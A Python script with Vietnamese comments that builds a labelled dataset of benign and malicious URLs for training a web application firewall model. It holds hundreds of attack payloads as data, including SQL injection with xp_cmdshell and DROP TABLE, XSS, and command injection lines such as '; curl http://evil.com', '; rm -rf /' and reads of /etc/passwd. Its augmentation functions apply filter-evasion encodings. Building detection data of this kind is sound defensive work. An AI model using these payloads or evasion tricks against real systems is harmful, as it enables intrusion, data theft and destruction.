# -*- coding: utf-8 -*-
"""
🚀 SUPER WAF DATA GENERATOR - PHIÊN BẢN CẢI TIẾN
=================================================
Tính năng mới:
- Data Augmentation thông minh (URL encode, case variations)
- Cân bằng dữ liệu tự động (50:50 hoặc tùy chỉnh)
- Thêm 500+ attack patterns từ OWASP & PayloadsAllTheThings
- Validation để đảm bảo chất lượng
- Thống kê chi tiết
"""
import csv
import pandas as pd
import numpy as np
import urllib.parse
import random
import re
from collections import Counter

# ==============================================================================
# CẤU HÌNH
# ==============================================================================
NORMAL_ATTACK_RATIO = 0.5  # Tỷ lệ Attack trong tổng dataset (0.5 = 50% Attack, 50% Normal)
TARGET_TOTAL_SAMPLES = 80000  # Tổng số mẫu mục tiêu
OUTPUT_PATH = "./data/custom_data.csv"

RANDOM_SEED = 42
random.seed(RANDOM_SEED)
np.random.seed(RANDOM_SEED)

# ==============================================================================
# PHẦN 1: DỮ LIỆU BÌNH THƯỜNG (NORMAL)
# ==============================================================================

# 1.1 Production Prefixes (Môi trường thực tế)
prod_prefixes = [
    "http://www.google.com/search?q=",
    "https://www.facebook.com/profile.php?id=",
    "http://vnexpress.net/tin-tuc/the-gioi/",
    "https://shopee.vn/search?keyword=",
    "https://lazada.vn/products/",
    "/api/v1/users?page=",
    "/shop/products/details?id=",
    "/blog/posts/2023/10/15/",
    "/auth/login?redirect_url=",
    "/assets/css/style.css?v=",
    "/js/libs/jquery.min.js",
    "http://bank.com/transfer?session_id=",
    "/contact-us/submit?type=",
    "/admin/dashboard/settings?mode=",
    "/user/profile/view?id=",
    "/api/data/fetch?limit=10&offset=",
    "https://github.com/user/repo/blob/main/",
    "/images/products/2024/",
    "/download?file=",
    "/api/v2/products/search?category=",
]

# 1.2 Development URLs (Fix vấn đề cổng 8000, 3000 bị báo độc)
dev_urls = [
    "http://localhost:8000",
    "http://localhost:8000/login",
    "http://localhost:8000/home",
    "http://localhost:8000/dashboard",
    "http://localhost:8000/api/status",
    "http://localhost:8000/api/users",
    "http://127.0.0.1:8000/api/status",
    "http://127.0.0.1:8000/index.php",
    "http://localhost:3000",  # React/Node.js
    "http://localhost:3000/login",
    "http://localhost:3000/dashboard",
    "http://localhost:4200",  # Angular
    "http://localhost:4200/home",
    "http://localhost:5000",  # Flask
    "http://localhost:5000/api/data",
    "http://localhost:8080",  # Tomcat/Java
    "http://localhost:8080/tienda1",  # Giống CSIC dataset
    "http://localhost:8080/app/index.jsp",
    "http://0.0.0.0:8000",
    "http://0.0.0.0:8000/health",
    "http://test-server.local:8080/index.php",
    "http://dev.internal:9000/api/v1/status",
    # Thêm nhiều variations
    "/server:80/index.html",
    "/server:443/secure",
    "/app:9000/status",
    "http://192.168.1.100:8000/api",
    "http://10.0.0.5:3000/login",
]

# 1.3 Safe Payloads (Trông có vẻ nguy hiểm nhưng an toàn)
safe_payloads = [
    "hello world",
    "laptop_gaming_2024",
    "user@example.com",
    "admin.user@corp.net",
    "contact@company.vn",
    "a1b2c3d4e5",
    "session_123456789",
    "123e4567-e89b-12d3-a456-426614174000",  # UUID
    "2023-10-25T10:30:00Z",
    "2024-01-15 14:30:00",
    "dGhpcyBpcyBhIGJhc2U2NCBzdHJpbmc=",  # Base64
    "view=grid&sort=price_asc&page=1",
    "category=books&filter=new",
    "lang=en-US",
    "locale=vi-VN",
    "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",  # JWT header
    "address=123+Street,+City",
    "description=This+is+a+normal+text+with+symbols+like+!+@+#+$",
    "coordinates=10.762622,106.660172",
    "search?keyword=C%2B%2B+Programming",
    "select_option=1",
    "union_city=new_york",  # Có chữ "union" nhưng bình thường
    "script_id=500",  # Có chữ "script" nhưng bình thường
    "alert_message=success",  # Có chữ "alert" nhưng bình thường
    "product_name=iPhone+15+Pro",
    "color=red&size=XL",
    "quantity=5",
    "price_range=100-500",
    "rating=4.5",
    "review_text=Great+product!",
    "shipping_method=express",
    "payment_method=credit_card",
    "discount_code=SAVE20",
    "referral=friend",
    "source=google",
    "campaign=summer_sale",
    "utm_source=facebook&utm_medium=cpc",
    "order_id=ORD20240115001",
    "invoice_number=INV2024001",
    "tracking_code=1Z999AA10123456784",
    "membership_level=gold",
    "subscription_type=premium",
]

# ==============================================================================
# PHẦN 2: DỮ LIỆU TẤN CÔNG (ATTACK)
# ==============================================================================

# 2.1 SQL Injection (Comprehensive Collection)
sqli_vectors = [
    # Basic Auth Bypass
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "' OR 1=1 #",
    "' OR 1=1/*",
    ") OR ('1'='1--",
    "or 1=1--",
    "' or '1'='1",
    "admin' or '1'='1'--",
    "or 0=0 #",
    "' or 0=0 #",
    "or 0=0 --",
    "') or ('1'='1--",
    "') or '1'='1'--",
    
    # Time-based Blind SQLi
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:10'--",
    "1' AND SLEEP(5)--",
    "1' AND SLEEP(10)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "SELECT SLEEP(5)",
    "SELECT BENCHMARK(1000000,MD5('A'))",
    "SELECT pg_sleep(10)",
    "BEGIN DBMS_LOCK.SLEEP(5); END;",
    
    # UNION-based SQLi
    "UNION SELECT 1,2,3,4,5--",
    "UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',table_name FROM information_schema.tables WHERE 2>1--",
    "UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "ORDER BY 1--",
    "ORDER BY 10--",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT null, table_name FROM information_schema.tables--",
    "UNION SELECT load_file('/etc/passwd'),1,1,1",
    
    # Error-based SQLi
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(XSS)</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#",
    
    # Command Execution via SQLi
    "'; EXEC xp_cmdshell 'net user'--",
    "'; EXEC xp_cmdshell 'whoami'--",
    "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--",
    
    # Database Enumeration
    "SELECT @@VERSION",
    "SELECT version()",
    "SELECT name FROM master..syslogins",
    "UNION SELECT table_name, column_name FROM information_schema.columns",
    "SELECT * FROM all_tables",
    "SELECT usename FROM pg_user",
    "SELECT schema_name FROM information_schema.schemata",
    
    # Blind SQLi
    "AND (SELECT 1)=1",
    "AND (SELECT 1)=0",
    "1+OR+0x50=0x50",
    "id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74",
    "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--",
    
    # Polyglots & Advanced
    "1; DROP TABLE users",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
    "1' AND extractvalue(rand(),concat(0x3a,(select version())))--",
    
    # NoSQL Injection
    "{'$gt':''}",
    "{'$ne':null}",
    "admin' || '1'=='1",
    
    # Second-order SQLi patterns
    "admin'/**/--",
    "admin'%00",
    "admin'%16",
]

# 2.2 XSS (Extensive Collection from Various Cheat Sheets)
xss_vectors = [
    # Basic Vectors
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    
    # Tag Breakout
    "\"><script>alert(1)</script>",
    "</tag><svg onload=alert(1)>",
    "</script><svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><svg onload=alert(1)>",
    
    # Event Handlers
    "\"onmouseover=alert(1)//",
    "<x contenteditable onblur=alert(1)>lose focus!",
    "<body onscroll=alert(1)>",
    "<x onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<html ontouchstart=alert(1)>",
    "<video ontimeupdate=alert(1) controls src=x>",
    "<select onfocus=alert(1)>",
    "<textarea onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    
    # Advanced Techniques
    "<details open ontoggle=alert(1)>",
    "'onload=alert(1)><svg/1='",
    "<script src=data:,alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<svg/on<script><script>load=alert(1)//</script>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    
    # Obfuscation
    "javascript://%250Aalert(1)",
    "%253Csvg%25200%256Eload%253Dalert%25281%2529%253E",
    "javas&#99ript:alert(1)",
    "javascript&colon;alert(1)",
    "java\nscript:alert(1)",
    "java\tscript:alert(1)",
    "java\x00script:alert(1)",
    
    # Framework-specific
    "{{$new.constructor('alert(1)')()}}",  # AngularJS
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",  # Template injection
    "{{7*7}}",
    
    # File Upload XSS
    "\"><svg onload=alert(1)>.gif",
    "<img src=data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 onload=alert(1)>",
    
    # Exotic Vectors
    "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
    "<table background=javascript:alert(1)>",
    "<form><button formaction=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    
    # DOM-based XSS patterns
    "javascript:void(document.cookie)",
    "javascript:eval('alert(1)')",
    "data:text/html,<script>alert(1)</script>",
    
    # Bypass Filters
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<svg><script>alert&#40;1&#41</script>",
    "<img src=\"x\" onerror=\"alert(String.fromCharCode(88,83,83))\">",
]

# 2.3 OS Command Injection & Path Traversal
cmd_vectors = [
    # Path Traversal
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "/etc/passwd",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../../../etc/shadow",
    "../../../var/www/html/index.php",
    
    # Command Injection (Unix)
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "$(cat /etc/passwd)",
    "`cat /etc/passwd`",
    "; whoami",
    "| whoami",
    "& whoami",
    "$(whoami)",
    "`whoami`",
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "; id",
    "| id",
    "; uname -a",
    "; sleep 10",
    "| sleep 10",
    "; ping -c 10 8.8.8.8",
    "| ping -c 10 8.8.8.8",
    "; curl http://evil.com",
    "| wget http://evil.com",
    "; rm -rf /",
    
    # Command Injection (Windows)
    "& net user",
    "| dir",
    "& dir",
    "& type C:\\windows\\win.ini",
    "| type C:\\boot.ini",
    "& ipconfig",
    "| whoami",
    "& ping -n 10 127.0.0.1",
    
    # Null byte injection
    "file.txt%00.jpg",
    "/etc/passwd%00",
    
    # Filter bypass
    ";{cat,/etc/passwd}",
    "|{ls,-la}",
    "c''at /etc/passwd",
    "c\\at /etc/passwd",
]

# 2.4 LDAP Injection
ldap_vectors = [
    "*)(uid=*))(|(uid=*",
    "admin)(&(password=*))",
    "*))(|(cn=*))",
]

# 2.5 XML External Entity (XXE)
xxe_vectors = [
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]>",
]

# 2.6 Server-Side Template Injection (SSTI)
ssti_vectors = [
    "{{7*7}}",
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
]

# 2.7 NoSQL Injection (MongoDB)
nosql_vectors = [
    "{'$gt':''}",
    "{'$ne':null}",
    "{'$regex':'.*'}",
    "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
]

# Tổng hợp tất cả attack vectors
all_attack_vectors = (
    sqli_vectors + 
    xss_vectors + 
    cmd_vectors + 
    ldap_vectors + 
    xxe_vectors + 
    ssti_vectors + 
    nosql_vectors
)

# ==============================================================================
# PHẦN 3: DATA AUGMENTATION
# ==============================================================================

def url_encode_random(text, ratio=0.3):
    """Encode ngẫu nhiên một số ký tự trong chuỗi"""
    result = []
    for char in text:
        if random.random() < ratio and char not in ['/', '?', '&', '=']:
            result.append(urllib.parse.quote(char))
        else:
            result.append(char)
    return ''.join(result)

def double_url_encode(text):
    """Double URL encode (bypass WAF)"""
    return urllib.parse.quote(urllib.parse.quote(text, safe=''), safe='')

def case_variation(text):
    """Thay đổi case ngẫu nhiên (ScRiPt, SCRIPT, script)"""
    variations = []
    # Original
    variations.append(text)
    # UPPERCASE
    variations.append(text.upper())
    # lowercase
    variations.append(text.lower())
    # RaNdOm CaSe
    random_case = ''.join(
        c.upper() if random.random() > 0.5 else c.lower() 
        for c in text
    )
    variations.append(random_case)
    return variations

def add_null_bytes(text):
    """Thêm null bytes để bypass filters"""
    positions = [0, len(text)//2, len(text)]
    variants = []
    for pos in positions:
        variant = text[:pos] + "%00" + text[pos:]
        variants.append(variant)
    return variants

def comment_injection(text):
    """Chèn comments vào giữa payload (SQL)"""
    if "select" in text.lower() or "union" in text.lower():
        variants = []
        variants.append(text.replace(" ", "/**/"))
        variants.append(text.replace(" ", "/*comment*/"))
        variants.append(text.replace(" ", "--\n"))
        return variants
    return [text]

def augment_attack_payload(payload):
    """Tạo nhiều biến thể của một attack payload"""
    augmented = []
    
    # Original
    augmented.append(payload)
    
    # URL Encode (30% ký tự)
    augmented.append(url_encode_random(payload, ratio=0.3))
    augmented.append(url_encode_random(payload, ratio=0.5))
    
    # Full URL Encode
    augmented.append(urllib.parse.quote(payload, safe=''))
    
    # Double URL Encode
    if random.random() > 0.7:  # Không phải tất cả, tránh quá nhiều
        augmented.append(double_url_encode(payload))
    
    # Case variations (chỉ với XSS/HTML tags)
    if '<' in payload or 'script' in payload.lower():
        augmented.extend(case_variation(payload)[:2])  # Lấy 2 variations
    
    # Null bytes
    if random.random() > 0.8:  # Ít thôi
        augmented.extend(add_null_bytes(payload)[:1])
    
    # Comment injection (SQL)
    if any(kw in payload.lower() for kw in ['select', 'union', 'or', 'and']):
        augmented.extend(comment_injection(payload)[:1])
    
    return augmented

# ==============================================================================
# PHẦN 4: TẠO DỮ LIỆU
# ==============================================================================

def generate_normal_data():
    """Tạo dữ liệu bình thường"""
    normal_data = []
    
    # A. Ghép Prefix + Safe Payload
    for prefix in prod_prefixes:
        for payload in safe_payloads:
            normal_data.append(prefix + payload)
            
            # Thêm tham số
            if "?" not in prefix:
                normal_data.append(prefix + "?q=" + payload)
            else:
                normal_data.append(prefix + "&data=" + payload)
    
    # B. Dev URLs (Nhân bản mạnh)
    normal_data.extend(dev_urls * 150)
    
    # C. Variations của safe payloads (để model học tốt hơn)
    for payload in safe_payloads[:20]:  # Lấy 20 cái đầu
        # URL encode
        normal_data.append(urllib.parse.quote(payload, safe=''))
        # Ghép với prefix ngẫu nhiên
        prefix = random.choice(prod_prefixes)
        normal_data.append(prefix + payload)
    
    return normal_data

def generate_attack_data():
    """Tạo dữ liệu tấn công với augmentation"""
    attack_data = []
    
    print("🔄 Đang tạo attack data với augmentation...")
    
    # Duyệt qua từng attack vector
    for i, payload in enumerate(all_attack_vectors):
        # 1. Augmentation (tạo biến thể)
        augmented_payloads = augment_attack_payload(payload)
        
        # 2. Ghép với prefixes
        for aug_payload in augmented_payloads:
            for prefix in prod_prefixes:
                # Dạng 1: Parameter injection
                if "=" in prefix:
                    attack_data.append(prefix + aug_payload)
                # Dạng 2: Path injection
                else:
                    attack_data.append(prefix + "/" + aug_payload)
        
        # Progress
        if (i + 1) % 100 == 0:
            print(f"  Đã xử lý {i+1}/{len(all_attack_vectors)} attack vectors...")
    
    return attack_data

def balance_dataset(normal_data, attack_data, target_total, attack_ratio):
    """Cân bằng dataset theo tỷ lệ mong muốn"""
    target_attack = int(target_total * attack_ratio)
    target_normal = target_total - target_attack
    
    print(f"\n📊 Cân bằng dataset:")
    print(f"  Mục tiêu: {target_normal} Normal + {target_attack} Attack = {target_total} total")
    
    # Resample
    if len(normal_data) < target_normal:
        # Nhân bản nếu thiếu
        multiplier = target_normal // len(normal_data) + 1
        normal_data = normal_data * multiplier
    
    if len(attack_data) < target_attack:
        multiplier = target_attack // len(attack_data) + 1
        attack_data = attack_data * multiplier
    
    # Random sample để đúng số lượng
    normal_data = random.sample(normal_data, target_normal)
    attack_data = random.sample(attack_data, target_attack)
    
    print(f"  Kết quả: {len(normal_data)} Normal + {len(attack_data)} Attack")
    
    return normal_data, attack_data

# ==============================================================================
# PHẦN 5: VALIDATION & STATISTICS
# ==============================================================================

def validate_data(df):
    """Kiểm tra chất lượng dữ liệu"""
    print("\n🔍 VALIDATION:")
    
    # 1. Check empty
    empty_count = df['text'].isna().sum() + (df['text'] == '').sum()
    print(f"  Empty payloads: {empty_count}")
    
    # 2. Check duplicates
    dup_count = df.duplicated(subset=['text']).sum()
    dup_pct = (dup_count / len(df)) * 100
    print(f"  Duplicates: {dup_count} ({dup_pct:.2f}%)")
    
    # 3. Length statistics
    df['length'] = df['text'].str.len()
    print(f"  Length stats:")
    print(f"    Min: {df['length'].min()}")
    print(f"    Max: {df['length'].max()}")
    print(f"    Mean: {df['length'].mean():.1f}")
    print(f"    Median: {df['length'].median():.1f}")
    
    # 4. Keyword analysis
    attack_df = df[df['label'] == 1]
    keywords = ['script', 'select', 'union', 'alert', 'etc/passwd', 'drop', 'exec']
    print(f"\n  Attack keywords coverage:")
    for kw in keywords:
        count = attack_df['text'].str.lower().str.contains(kw, regex=False).sum()
        pct = (count / len(attack_df)) * 100
        print(f"    '{kw}': {count} ({pct:.1f}%)")
    
    return df

def print_statistics(df):
    """In thống kê chi tiết"""
    print("\n" + "="*60)
    print("📈 THỐNG KÊ DỮ LIỆU CUỐI CÙNG")
    print("="*60)
    
    total = len(df)
    attack_count = (df['label'] == 1).sum()
    normal_count = (df['label'] == 0).sum()
    attack_pct = (attack_count / total) * 100
    
    print(f"\n✅ Tổng số mẫu: {total:,}")
    print(f"  🟢 Normal:  {normal_count:,} ({100-attack_pct:.1f}%)")
    print(f"  🔴 Attack:  {attack_count:,} ({attack_pct:.1f}%)")
    print(f"  📊 Tỷ lệ Attack/Normal: {attack_count/normal_count:.2f}")
    
    # Sample examples
    print(f"\n📝 SAMPLE EXAMPLES:")
    print(f"\n  Normal samples (5 mẫu ngẫu nhiên):")
    for i, text in enumerate(df[df['label']==0].sample(5)['text'].values, 1):
        print(f"    {i}. {text[:80]}...")
    
    print(f"\n  Attack samples (5 mẫu ngẫu nhiên):")
    for i, text in enumerate(df[df['label']==1].sample(5)['text'].values, 1):
        print(f"    {i}. {text[:80]}...")

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================

def main():
    print("🚀 BẮT ĐẦU TẠO DỮ LIỆU...")
    print(f"⚙️  Cấu hình:")
    print(f"  - Target samples: {TARGET_TOTAL_SAMPLES:,}")
    print(f"  - Attack ratio: {NORMAL_ATTACK_RATIO*100:.0f}%")
    print(f"  - Normal ratio: {(1-NORMAL_ATTACK_RATIO)*100:.0f}%")
    
    # 1. Tạo dữ liệu raw
    print("\n🔨 Bước 1: Tạo dữ liệu raw...")
    normal_data = generate_normal_data()
    attack_data = generate_attack_data()
    
    print(f"  Raw Normal: {len(normal_data):,}")
    print(f"  Raw Attack: {len(attack_data):,}")
    
    # 2. Cân bằng
    print("\n⚖️  Bước 2: Cân bằng dữ liệu...")
    normal_data, attack_data = balance_dataset(
        normal_data, 
        attack_data, 
        TARGET_TOTAL_SAMPLES, 
        NORMAL_ATTACK_RATIO
    )
    
    # 3. Tạo DataFrame
    print("\n📦 Bước 3: Tạo DataFrame...")
    df_normal = pd.DataFrame({'text': normal_data, 'label': 0})
    df_attack = pd.DataFrame({'text': attack_data, 'label': 1})
    df_final = pd.concat([df_normal, df_attack], ignore_index=True)
    
    # 4. Shuffle
    print("🔀 Bước 4: Xáo trộn dữ liệu...")
    df_final = df_final.sample(frac=1, random_state=RANDOM_SEED).reset_index(drop=True)
    
    # 5. Validation
    df_final = validate_data(df_final)
    
    # 6. Remove duplicates (optional - giữ một số duplicates để model học)
    before_dedup = len(df_final)
    df_final = df_final.drop_duplicates(subset=['text'], keep='first')
    removed = before_dedup - len(df_final)
    print(f"\n  Đã xóa {removed} duplicates")
    
    # 7. Print statistics
    print_statistics(df_final)
    
    # 8. Save
    print(f"\n💾 Bước 5: Lưu file...")
    import os
    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
    df_final.to_csv(
        OUTPUT_PATH, 
        index=False,
        escapechar='\\',
        doublequote=True,
        quoting=csv.QUOTE_NONNUMERIC
    )
    
    print(f"\n✅ HOÀN THÀNH!")
    print(f"📁 File đã lưu tại: {OUTPUT_PATH}")
    print(f"📊 Kích thước file: {os.path.getsize(OUTPUT_PATH) / 1024 / 1024:.2f} MB")
    
    print("\n" + "="*60)
    print("📋 BƯỚC TIẾP THEO:")
    print("="*60)
    print("1. python preprocess.py  # Xử lý và gộp dữ liệu")
    print("2. python train.py       # Huấn luyện model")
    print("3. python report.py      # Xem báo cáo kết quả")
    print("="*60)

if __name__ == "__main__":
    main()